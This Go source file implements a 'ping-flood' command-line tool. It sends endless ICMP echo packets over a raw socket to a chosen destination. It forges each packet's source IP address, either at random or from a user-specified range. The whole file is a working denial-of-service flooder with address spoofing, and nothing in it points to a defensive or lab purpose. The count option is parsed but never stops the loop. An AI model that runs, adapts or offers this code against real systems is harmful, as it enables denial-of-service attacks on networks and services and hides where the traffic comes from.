package module

import (
	"os"
	"log"
	"fmt"
	_"flag"
	"time"
	"net"
	"syscall"
	"math/rand"
	"encoding/binary"

	"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

var opts struct {
	Spoof string `short:"s" long:"spoof" description:"use spoof address" value-name:"address[/mask]" default:""`
	Dest string `short:"d" long:"destination" description:"destination address" value-name:"address[/mask]" default:""`
	Count int `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
	Rate string `short:"r" long:"rate" description:"send packets as a specific rate" value-name:"<speed>" default:"nolimit"`
	TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
}

func pingFloodEntry(remainFlags []string) {
	//fmt.Println(remainFlags)
	rand.Seed(time.Now().UnixNano())
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)
	//cmd := flag.NewFlagSet("ping-flood", flag.ContinueOnError)

	/*
	spoof := cmd.String("spoof", "", "use spoof address")
	dest := cmd.String("destination", "", "destination address")
	count := cmd.Int("count", -1, "stop after sending `count` packets")
	rate := cmd.String("rate", "nolimit", "send packets as a specific rate")
	ttl := cmd.Uint("ttl", 64, "set TTL of IP packet")
	*/

	//cmd.Parse(flags)
	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		log.Fatal(err)
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			//cmd.PrintDefaults()
			cmd.WriteHelp(os.Stderr)
			return
		}
	}
	//fmt.Println(*spoof, *dest, *count)
	if opts.Count < 0 {
		opts.Count = int(^uint(0) >> 1)
	}
	pingFloodStart(opts.Spoof, opts.Dest, uint(opts.Count), opts.Rate, opts.TTL)
}

func pingFloodStart(spoof, dest string, count uint, rate string, ttl uint) {
	if rate == "nolimit" {
		var fd int = -1
		var err error
		for {
			srcip := chooseIPv4(spoof)
			fmt.Println("sending packet using IP = ", srcip.String())
			dstip := net.ParseIP(dest)
			if  dstip == nil {
				log.Fatal("Invalid destination")
			}

			icmp4 := &protocol.ICMPv4 {
				Type: 8, // ICMP echo
				Code: 0,
				Id: 0x2237,
				Seq: 0x3a,
				Data: []byte{0x1e,0x0a,0x05,0x00,0x00,0x00,0x00,0x00,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x2f,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37},
			}
			ip4 := &protocol.IPv4Packet {
				Version: 4,
				IHL: 5,
				DSCP: 0,
				ECN: 0, // RFC 792 requires TOS = 0
				ID: uint16(rand.Intn(0xffff)),
				DF: true,
				MF: false,
				FragmentOffset: 0,
				TTL: 64,
				Protocol: protocol.IPP_ICMP,
				SrcIP: srcip,
				DstIP: net.ParseIP(dest),
			}

			if fd == -1 {
				fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
				log.Println("fd = ", fd)
				if err != nil {
					log.Fatal("Scoket: ", err)
				}
			}

			err = send(fd, ip4, icmp4)
			if err != nil {
				log.Fatal("ping-flood send:", err)
			}
		}

	} else {
		fmt.Println("we haven't support this feature yet")
	}
}

func randomIPv4() net.IP {
	a, b, c, d := rand.Intn(254) + 1, rand.Intn(254) + 1, rand.Intn(254) + 1, rand.Intn(254) + 1
	return net.IPv4(byte(a), byte(b), byte(c), byte(d))
}

func chooseIPv4(spoof string) net.IP {
	var ip net.IP
	if len(spoof) > 0 {
		_, ipnet, err := net.ParseCIDR(spoof)
		if err != nil {
			log.Fatal(err)
		}
		ipmask := binary.BigEndian.Uint32(ipnet.Mask)
		up := 1
		for i := 0; i < 32; i++ {
			if ipmask >> uint(i) & 1 == 1 {
				break
			}
			up <<= 1
		}

		tmp := make([]byte, 4, 4)
		binary.BigEndian.PutUint32(tmp[0:4], binary.BigEndian.Uint32(ipnet.IP) + uint32(rand.Intn(up)))
		ip = net.IPv4(tmp[0], tmp[1], tmp[2], tmp[3])
	} else {
		ip = randomIPv4()
	}
	return ip
}
